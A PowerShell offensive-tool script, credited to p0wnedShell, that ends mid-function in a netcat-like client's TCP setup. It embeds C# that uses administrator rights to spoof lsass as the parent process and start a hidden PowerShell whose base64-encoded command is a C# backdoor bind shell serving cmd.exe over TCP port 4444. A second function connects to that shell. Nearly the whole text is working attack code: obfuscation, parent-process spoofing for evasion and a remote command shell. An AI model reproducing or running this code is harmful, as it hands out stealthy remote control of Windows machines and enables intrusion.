function RemoteProcessBind
{
#Credits to Cn33liz, code copied from: https://github.com/Cn33liz/p0wnedShell/tree/master/p0wnedShell
$easyPPID = @"
using System;
using System.Security.Principal;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace HighPrivs
{
    public class SystemPPID
    {
        public static void EasySystemPPID()
        {
            if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] For this function to succeed, you need UAC Elevated Administrator privileges.");
                Console.ResetColor();
                return;
            }

            string szCommandLine = "powershell.exe -w 2 -noni -noP -sta -enc JABlAGEAcwB5AGIAaQBuAGQAIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0ADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBUAGgAcgBlAGEAZABpAG4AZwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBJAE8AOwAKAG4AYQBtAGUAcwBwAGEAYwBlACAAQgBhAGMAawBkAG8AbwByAFMAZQByAHYAZQByAAoAewAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABCAGEAYwBrAGQAbwBvAHIACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgAgAGwAaQBzAHQAZQBuAGUAcgA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABTAG8AYwBrAGUAdAAgAG0AYQBpAG4AUwBvAGMAawBlAHQAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAaQBuAHQAIABwAG8AcgB0ADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGkAbgBnACAAbgBhAG0AZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABiAG8AbwBsACAAdgBlAHIAYgBvAHMAZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABQAHIAbwBjAGUAcwBzACAAcwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAZgByAG8AbQBTAGgAZQBsAGwAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAIAB0AG8AUwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAaQBuAFMAdAByAGUAYQBtADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACAAbwB1AHQAUwB0AHIAZQBhAG0AOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAVABoAHIAZQBhAGQAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAOwAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAF8AYgBpAG4AZAAoAHMAdAByAGkAbgBnACAAaQBwACwAIABJAG4AdAAzADIAIABwAG8AcgB0ACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIAYQBjAGsAZABvAG8AcgAgAGIAZAAgAD0AIABuAGUAdwAgAEIAYQBjAGsAZABvAG8AcgAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAZAAuAHMAdABhAHIAdABTAGUAcgB2AGUAcgAoAGkAcAAsAHAAbwByAHQAKQA7AAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB2AG8AaQBkACAAcwB0AGEAcgB0AFMAZQByAHYAZQByACgAcwB0AHIAaQBuAGcAIABuAHMALABpAG4AdAAgAHAAbwByAHQAYQAsACAAYgBvAG8AbAAgAHYAZQByAGIAPQBmAGEAbABzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAPQAgAG4AcwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG8AcgB0ACAAPQAgAHAAbwByAHQAYQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGUAcgBiAG8AcwBlACAAPQAgAHYAZQByAGIAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBQAEEAZABkAHIAZQBzAHMAIABpAHAAIAA9ACAASQBQAEEAZABkAHIAZQBzAHMALgBQAGEAcgBzAGUAKABuAHMAKQA7AAoACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBMAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAHAAbwByAHQAIAAiACAAKwAgAHAAbwByAHQAKQA7AAoAbABpAHMAdABlAG4AZQByACAAPQAgAG4AZQB3ACAAVABjAHAATABpAHMAdABlAG4AZQByACgAaQBwACwAIABwAG8AcgB0ACkAOwAKAGwAaQBzAHQAZQBuAGUAcgAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAgAD0AIABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABTAG8AYwBrAGUAdAAoACkAOwAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAHYAZQByAGIAbwBzAGUAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAEMAbABpAGUAbgB0ACAAYwBvAG4AbgBlAGMAdABlAGQAOgAgACIAIAArACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAuAFIAZQBtAG8AdABlAEUAbgBkAFAAbwBpAG4AdAApADsACgBTAHQAcgBlAGEAbQAgAHMAIAA9ACAAbgBlAHcAIABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtACgAbQBhAGkAbgBTAG8AYwBrAGUAdAApADsACgBpAG4AUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0ALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAB0AHIAdQBlADsAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAIAA9ACAAbgBlAHcAIABQAHIAbwBjAGUAcwBzACgAKQA7AAoAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAAUAByAG8AYwBlAHMAcwBXAGkAbgBkAG8AdwBTAHQAeQBsAGUALgBIAGkAZABkAGUAbgA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAHIAbwBjAGUAcwBzAFMAdABhAHIAdABJAG4AZgBvACAAcAAgAD0AIABuAGUAdwAgAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AKAAiAGMAbQBkACIAKQA7AAoAcAAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAD0AIABQAHIAbwBjAGUAcwBzAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAuAEgAaQBkAGQAZQBuADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAIAA9ACAAdAByAHUAZQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAIAA9ACAAZgBhAGwAcwBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8AIAA9ACAAcAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBTAHQAYQByAHQAKAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwAIAA9ACAAcwBoAGUAbABsAC4AUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABmAHIAbwBtAFMAaABlAGwAbAAgAD0AIABzAGgAZQBsAGwALgBTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABvAFMAaABlAGwAbAAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAFQAaAByAGUAYQBkACAAPQAgAG4AZQB3ACAAVABoAHIAZQBhAGQAKABuAGUAdwAgAFQAaAByAGUAYQBkAFMAdABhAHIAdAAoAGcAZQB0AFMAaABlAGwAbABJAG4AcAB1AHQAKQApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB5AHMAdABlAG0AIABTAGgAZQBsAGwAIABzAHQAYQByAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkALgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB0AGEAcgB0AGkAbgBnACAAcwBoAGUAbABsAC4ALgAuAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZwBlAHQASQBuAHAAdQB0ACgAKQA7AAoAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQA7AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAGQAcgBvAHAAQwBvAG4AbgBlAGMAdABpAG8AbgAoACkAOwAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB2AG8AaQBkACAAZwBlAHQAUwBoAGUAbABsAEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAIAA9ACAAIgAiADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAXAByAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAdABlAG0AcABCAHUAZgAgAD0AIABmAHIAbwBtAFMAaABlAGwAbAAuAFIAZQBhAGQATABpAG4AZQAoACkAKQAgACEAPQAgAG4AdQBsAGwAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoAHQAZQBtAHAAQgB1AGYAIAArACAAIgBcAHIAIgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAfQAKAH0ACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGcAZQB0AEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAZgAgAD0AIAAiACIAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAKAB0AGUAbQBwAEIAdQBmAGYAIAA9ACAAaQBuAFMAdAByAGUAYQBtAC4AUgBlAGEAZABMAGkAbgBlACgAKQApACAAIQA9ACAAbgB1AGwAbAApACkACgAgACAAIAAgACAAIAAgACAAewAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbwBuAHMAbwBsAGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUgBlAGMAZQBpAHYAZQBkACAAYwBvAG0AbQBhAG4AZAA6ACAAIgAgACsAIAB0AGUAbQBwAEIAdQBmAGYAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaABhAG4AZABsAGUAQwBvAG0AbQBhAG4AZAAoAHQAZQBtAHAAQgB1AGYAZgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAH0ACgB9AAoACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGgAYQBuAGQAbABlAEMAbwBtAG0AYQBuAGQAKABTAHQAcgBpAG4AZwAgAGMAbwBtACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGMAbwBtAC4ARQBxAHUAYQBsAHMAKAAiAGUAeABpAHQAIgApACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AdQB0AFMAdAByAGUAYQBtAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAFwAbgBcAG4AQwBsAG8AcwBpAG4AZwAgAHQAaABlACAAcwBoAGUAbABsACAAYQBuAGQAIABEAHIAbwBwAHAAaQBuAGcAIAB0AGgAZQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgAuAC4AIgApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB0AG8AUwBoAGUAbABsAC4AVwByAGkAdABlAEwAaQBuAGUAKABjAG8AbQAgACsAIAAiAFwAcgBcAG4AIgApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsAIAB9AAoAfQAKAHAAcgBpAHYAYQB0AGUAIAB2AG8AaQBkACAAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQAKAHsACgAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAdgBlAHIAYgBvAHMAZQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBEAHIAbwBwAHAAaQBuAGcAIABDAG8AbgBuAGUAYwB0AGkAbwBuACIAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbAAuAEMAbABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAEEAYgBvAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAIAA9ACAAbgB1AGwAbAA7AAoAIAAgACAAIAAgACAAIAAgAGkAbgBTAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AUwBoAGUAbABsAC4ARABpAHMAcABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAG0AYQBpAG4AUwBvAGMAawBlAHQALgBDAGwAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgA7AAoAIAAgACAAIAB9AAoAIAAgACAAIABjAGEAdABjAGgAIAAoAEUAeABjAGUAcAB0AGkAbwBuACkAIAB7ACAAfQAKAH0AIAAgACAAIAAKACAAIAAgACAAfQAKAH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgACQAZQBhAHMAeQBiAGkAbgBkAAoAWwBCAGEAYwBrAGQAbwBvAHIAUwBlAHIAdgBlAHIALgBCAGEAYwBrAGQAbwBvAHIAXQA6ADoAXwBiAGkAbgBkACgAIgAxADIANwAuADAALgAwAC4AMQAiACwAIgA0ADQANAA0ACIAKQAKAA==";

            string PPIDName = "lsass";
            int NewPPID = 0;

            // Find PID from our new Parent and start new Process with new Parent ID
            NewPPID = ProcessCreator.NewParentPID(PPIDName);
            if (NewPPID == 0)
            {
                Console.WriteLine("\n[!] No suitable Process ID Found...");
                return;
            }

            if (!ProcessCreator.CreateProcess(NewPPID, null, szCommandLine))
            {
                Console.WriteLine("\n[!] Oops PPID Spoof failed...");
                return;
            }

            return;
        }

    }
    public class ProcessCreator
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum CreateProcessFlags : uint
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        static void FreeHandle(IntPtr handle)
        {
            Marshal.FreeHGlobal(handle);
            handle = IntPtr.Zero;
        }

        public static int NewParentPID(string ProcName)
        {
            int NewPPID = 0;
            Process[] processList = Process.GetProcesses();

            foreach (Process Proc in processList)
            {
                if (Proc.ProcessName == ProcName)
                {
                    try
                    {
                        IntPtr pHandle = Process.GetProcessById(Proc.Id).Handle;
                        if (pHandle != IntPtr.Zero)
                        {
                            NewPPID = Proc.Id;
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        string ErrorMessage = ex.Message;
                    }
                }
            }

            return NewPPID;
        }

        public static bool CreateProcess(int parentProcessId, string lpApplicationName, string lpCommandLine)
        {
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo = new STARTUPINFO();

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            if (parentProcessId > 0)
            {
                IntPtr lpSize = Marshal.AllocHGlobal(IntPtr.Size);
                bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                if (success || lpSize == IntPtr.Zero)
                {
                    FreeHandle(lpSize);
                    return false;
                }

                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                if (sInfoEx.lpAttributeList == IntPtr.Zero)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(lpSize);
                    return false;
                }

                success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                if (!success)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(lpSize);
                    return false;
                }

                FreeHandle(lpSize);

                IntPtr parentProcessHandle = Marshal.AllocHGlobal(IntPtr.Size);
                IntPtr hProcess = Process.GetProcessById(parentProcessId).Handle;
                Marshal.WriteIntPtr(parentProcessHandle, hProcess);
                success = UpdateProcThreadAttribute(
                    sInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    parentProcessHandle,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);
                if (!success)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(parentProcessHandle);
                    return false;
                }

                sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
                FreeHandle(sInfoEx.lpAttributeList);
                FreeHandle(parentProcessHandle);
            }

            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool result = CreateProcess(
                lpApplicationName,
                lpCommandLine,
                ref pSec,
                ref tSec,
                false,
                CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | CreateProcessFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref sInfoEx,
                out pInfo);
            if (!result)
            {
                return false;
            }

            return true;
        }
    }
}
"@

Add-Type -TypeDefinition $easyPPID
[HighPrivs.SystemPPID]::EasySystemPPID()
Start-Sleep -Seconds 2
Write-Host -ForegroundColor Yellow "Press Enter for the Shell..."

connecting -c 127.0.0.1 -p 4444
}

function Connecting
{
  param(
    [alias("Client")][string]$c="",
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Relay")][string]$r="",
    [alias("Timeout")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("Disconnect")][switch]$d=$False
    )
  
  
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = New-Object System.Net.Sockets.TcpClient
      Write-Verbose "Connecting..."
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
      $Socket = New-Object System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }
    
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
        {
          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        Write-Verbose "Timeout!" ; break
        break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            $BufferSize = $Socket.ReceiveBufferSize
            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          $BufferSize = $Client.ReceiveBufferSize
          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars["Stream"] = $Stream
    $FuncVars["Socket"] = $Socket
    $FuncVars["BufferSize"] = $BufferSize
    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
